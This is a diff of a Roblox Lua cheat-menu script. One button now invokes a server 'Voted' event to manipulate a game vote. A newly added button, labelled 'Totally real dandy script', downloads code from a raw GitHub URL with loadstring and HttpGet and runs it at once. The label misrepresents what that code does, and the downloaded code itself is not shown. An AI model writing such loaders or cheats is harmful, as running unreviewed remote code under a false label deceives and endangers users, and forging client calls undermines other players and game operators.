@@ -876,7 +876,11 @@ Name = <string> - The name of the section.
 Tab:AddButton({
 	Name = "Press to troll",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/MostValuable/lobotomised/refs/heads/main/lobotomy"))
+      		local args = {
+    [1] = "Dandy"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Voted"):InvokeServer(unpack(args))
 
   	end    
 })
@@ -885,6 +889,29 @@ Tab:AddButton({
 Name = <string> - The name of the button.
 Callback = <function> - The function of the button.
 ]]
+
+
+local Section = Tab:AddSection({
+	Name = "Ty 🕷Spooky Sonat🎃 for helping me making it"
+})
+
+--[[
+Name = <string> - The name of the section.
+]]
+
+
+Tab:AddButton({
+	Name = "Totally real dandy script",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/MostValuable/lobotomised/refs/heads/main/lobotomy"))
+
+  	end    
+})
+
+
+
+
+
 
 local Tab = Window:MakeTab({
 	Name = "Gameplay Script!",
